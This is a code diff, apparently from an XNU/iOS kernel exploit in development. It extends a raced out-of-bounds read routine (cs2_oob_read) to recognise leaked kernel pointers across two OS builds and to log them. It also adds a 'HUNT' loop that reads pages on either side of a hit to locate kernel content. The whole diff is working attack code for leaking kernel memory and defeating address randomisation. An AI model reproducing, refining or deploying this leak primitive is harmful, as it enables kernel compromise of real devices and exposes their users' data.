@@ -103,14 +103,25 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
             memcpy(&q0, buffer, sizeof(q0));
             if (nread >= 16) memcpy(&q1, buffer + 8, sizeof(q1));
             uint64_t unmarked = 0, kptr_n = 0, spray_n = 0, first_foreign = 0;
+            uint64_t zerofill_n = 0;
+            static uint64_t kptr_seen[8] = {0};
+            static int kptr_seen_n = 0;
+            uint64_t unmarked_q[12] = {0}; int unmarked_q_n = 0;
             size_t nq = (size_t)nread / 8;
             for (size_t qi = 0; qi < nq; qi++) {
                 uint64_t q = 0;
                 memcpy(&q, buffer + qi * 8, sizeof(q));
                 if (q == cs2_ctx.random_marker) continue;
+                if (q == 0) { zerofill_n++; continue; }  /* v2: the 0x7000 zero-hole page is NOT kernel content */
                 unmarked++;
                 if (!first_foreign) first_foreign = q;
-                if ((q >> 36) == 0xfffffff0ull) kptr_n++;
+                /* v2: the 24A435 band (0xfffffe00-class kvas) joins the 23F77 band */
+                if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
+                    q >= 0xfffffe0000000000ull) {
+                    kptr_n++;
+                    if (kptr_seen_n < 8) kptr_seen[kptr_seen_n++] = q;
+                }
+                if (unmarked_q_n < 12) unmarked_q[unmarked_q_n++] = q;
                 if ((q >> 32) == 0xc0dec0deull) spray_n++;
             }
             /* OG: wholesale page replace, q0 != marker.
@@ -118,6 +129,12 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                foreign). Hunt those windows too. hop-1 stays closed. */
             bool wholesale = (unmarked > 0 && q0 != cs2_ctx.random_marker);
             bool partial = (cs2_ctx.copy_confusion_lane && unmarked > 0 && q0 == cs2_ctx.random_marker);
+            if (unmarked == 0 && zerofill_n > 0) {
+                static uint64_t hole_logs = 0;
+                if (cs2_ctx.copy_confusion_lane && hole_logs++ < 6)
+                    LOG("[oob] HOLEWINDOW lane=copy27 zerofill=%llu w=%zd (the 0x7000 hole -- HUNT follows)",
+                        (unsigned long long)zerofill_n, w);
+            }
             if (wholesale || partial) {
                 read_race_succeeded = true;
                 cs2_ctx.success_read_count += 1;
@@ -139,7 +156,49 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                             (unsigned long long)spray_n);
                     }
                 }
-                break;
+                    /* v2: the unmarked dump + the kptr rows */
+                    for (int ui = 0; ui < unmarked_q_n; ui++)
+                        LOG("[oob] HIT unmarked[%d]=%#llx", ui, (unsigned long long)unmarked_q[ui]);
+                    for (int ki = 0; ki < kptr_seen_n; ki++)
+                        LOG("[oob] HIT kptr[%d]=%#llx", ki, (unsigned long long)kptr_seen[ki]);
+                    /* v2: the bidirectional HUNT around this anchor (hole
+                       geometry and real-content windows) — +/-6 pages,
+                       stop at the first real-content page. */
+                    {
+                        static const off_t steps2[11] = { 0x1000, -0x1000, 0x2000, -0x2000, 0x3000, -0x3000, 0x4000, -0x4000, 0x5000, -0x5000, 0x6000 };
+                        for (int si2 = 0; si2 < 11; si2++) {
+                            memset_pattern8(buffer, &cs2_ctx.random_marker, size);
+                            ssize_t wn = pread(cs2_ctx.read_fd, buffer, size, 0x3f00 + offset + steps2[si2]);
+                            if (wn < 8) continue;
+                            uint64_t wu = 0, wk = 0, wz = 0, wf = 0;
+                            static uint64_t wk_seen[4] = {0};
+                            int wk_n = 0;
+                            size_t wnq = (size_t)wn / 8;
+                            for (size_t wqi = 0; wqi < wnq; wqi++) {
+                                uint64_t wq = 0;
+                                memcpy(&wq, buffer + wqi * 8, sizeof(wq));
+                                if (wq == cs2_ctx.random_marker) continue;
+                                if (wq == 0) { wz++; continue; }
+                                wu++;
+                                if (!wf) wf = wq;
+                                if ((wq >> 36) == 0xfffffff0ull || (wq >> 32) == 0xfffffe00ull ||
+                                    wq >= 0xfffffe0000000000ull) {
+                                    wk++;
+                                    if (wk_n < 4) wk_seen[wk_n++] = wq;
+                                }
+                            }
+                            if (wu)
+                                LOG("[oob] HUNT %#llx content=%llu zero=%llu kptr=%llu%s first=%#llx",
+                                    (unsigned long long)(0x3f00 + offset + steps2[si2]),
+                                    (unsigned long long)wu, (unsigned long long)wz,
+                                    (unsigned long long)wk, wk ? "  <-- POINTERS" : "  <-- CONTENT",
+                                    (unsigned long long)wf);
+                            for (int ki = 0; ki < wk_n && ki < 4; ki++)
+                                LOG("[oob] HUNT kptr=0x%016llx", (unsigned long long)wk_seen[ki]);
+                            if (wu > 0) break;
+                        }
+                    }
+                    break;
             }
             {
                 static uint64_t miss_logs = 0;
